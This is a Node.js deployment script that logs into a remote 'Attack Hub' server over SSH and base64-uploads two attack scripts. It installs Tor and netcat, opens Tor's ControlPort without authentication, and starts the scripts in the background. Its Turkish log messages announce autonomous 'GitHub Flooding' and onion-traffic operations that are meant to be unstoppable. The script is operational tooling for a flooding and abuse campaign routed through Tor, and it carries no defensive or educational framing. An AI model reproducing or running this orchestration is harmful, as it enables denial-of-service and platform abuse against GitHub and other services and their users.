
require('dotenv').config();
const { NodeSSH } = require('node-ssh');
const fs = require('fs');
const path = require('path');

const ssh = new NodeSSH();

async function finalStrike() {
  try {
    console.log('📡 [GOD MODE] Connecting to Attack Hub (31.97.79.34)...');
    await ssh.connect({
      host: process.env.ATTACK_SERVER_IP,
      username: process.env.ATTACK_SERVER_USER,
      password: process.env.ATTACK_SERVER_PASS
    });

    console.log('✅ Connected.');

    const scriptsToUpload = [
      { local: 'scripts/tor-traffic-monster.ts', remote: '/root/warrior/scripts/tor-traffic-monster.ts' },
      { local: 'scripts/hydra-parasite-hub.ts', remote: '/root/hydra-attack/scripts/hydra-parasite-hub.ts' }
    ];

    for (const s of scriptsToUpload) {
      const localPath = path.join(__dirname, s.local);
      if (fs.existsSync(localPath)) {
        const content = fs.readFileSync(localPath).toString('base64');
        await ssh.execCommand(`echo "${content}" | base64 -d > ${s.remote}`);
        console.log(`📤 Uploaded: ${s.local}`);
      }
    }

    console.log('⚙️ Installing TOR & Starting Services...');
    await ssh.execCommand('apt-get update && apt-get install -y tor netcat-openbsd || true');
    
    // TOR Konfigürasyonu (ControlPort açma)
    await ssh.execCommand('grep -q "ControlPort 9051" /etc/tor/torrc || echo "ControlPort 9051" >> /etc/tor/torrc');
    await ssh.execCommand('grep -q "CookieAuthentication 0" /etc/tor/torrc || echo "CookieAuthentication 0" >> /etc/tor/torrc');
    await ssh.execCommand('service tor restart');

    console.log('🚀 Launching Final Strike (A & B)...');
    await ssh.execCommand('cd /root/warrior && nohup npx tsx scripts/tor-traffic-monster.ts > monster.log 2>&1 &');
    await ssh.execCommand('cd /root/hydra-attack && nohup npx tsx scripts/hydra-parasite-hub.ts > parasite.log 2>&1 &');

    console.log('\n🌟 [MISSION ACCOMPLISHED]');
    console.log('A (GitHub Flooding) ve B (Onion Traffic) operasyonları otonom olarak devrede.');
    console.log('Sovereign Hydra şu an durdurulamaz bir güç halinde.');

  } catch (err) {
    console.error('❌ Final Strike Failed:', err.message);
  } finally {
    ssh.dispose();
    process.exit(0);
  }
}

finalStrike();
